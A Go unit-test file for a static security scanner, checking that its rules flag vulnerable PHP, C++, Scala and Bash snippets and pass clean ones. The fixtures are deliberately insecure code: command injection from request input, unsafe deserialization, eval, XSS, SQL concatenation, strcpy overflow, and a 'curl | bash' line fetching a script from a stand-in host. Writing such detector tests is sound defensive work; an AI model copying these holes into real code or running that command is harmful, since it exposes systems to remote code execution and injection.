package sast

import (
	"testing"

	"github.com/tlmcguire/aisai/internal/ast"
)

// TestNewLanguagesEndToEnd parses real source through Tree-sitter and checks
// that the pattern rules fire for PHP, C++, Scala and Bash.
func TestNewLanguagesEndToEnd(t *testing.T) {
	cases := []struct {
		path, src, rule string
	}{
		{"a.php", "<?php\nsystem($_GET['cmd']);\n", RuleSubprocessShellTrue},
		{"b.php", "<?php\n$h = md5($pw);\n", RuleWeakHashMD5SHA1},
		{"c.php", "<?php\n$o = unserialize($_COOKIE['x']);\n", RulePickleYamlUnsafeLoad},
		{"d.php", "<?php\neval($code);\n", RuleEvalExecNonliteral},
		{"e.php", "<?php\necho $_GET['name'];\n", RuleXSSUnsafeOutput},
		{"f.php", "<?php\n$db->query(\"SELECT * FROM t WHERE id=\" . $id);\n", RuleSQLInjectionConcat},
		{"g.cpp", "#include <cstring>\nvoid f(char*s){ char b[8]; strcpy(b, s); }\n", RuleUnsafeCFunction},
		{"h.scala", "object A { def f(c: String) = Runtime.getRuntime().exec(c) }\n", RuleSubprocessShellTrue},
		{"i.sh", "#!/bin/bash\ncurl -s http://x.example/i.sh | bash\n", RuleSubprocessShellTrue},
		{"j.sh", "#!/bin/bash\neval \"$USER_INPUT\"\n", RuleEvalExecNonliteral},
	}
	for _, c := range cases {
		f, err := ast.ParseString(c.path, c.src)
		if err != nil {
			t.Fatalf("%s: parse: %v", c.path, err)
		}
		found := false
		for _, fd := range scanPatterns(f) {
			if fd.Rule == c.rule {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: rule %s did not fire", c.path, c.rule)
		}
	}
}

func TestNewLanguagesCleanCode(t *testing.T) {
	for path, src := range map[string]string{
		"ok.php":   "<?php\necho htmlspecialchars($name);\n$h = hash('sha256', $x);\n",
		"ok.sh":    "#!/bin/bash\nset -euo pipefail\necho \"hi\"\n",
		"ok.scala": "object A { def f(x: Int) = x + 1 }\n",
		"ok.cpp":   "int main() { return 0; }\n",
	} {
		f, err := ast.ParseString(path, src)
		if err != nil {
			t.Fatalf("%s: %v", path, err)
		}
		if got := scanPatterns(f); len(got) != 0 {
			t.Errorf("%s: unexpected findings %+v", path, got)
		}
	}
}
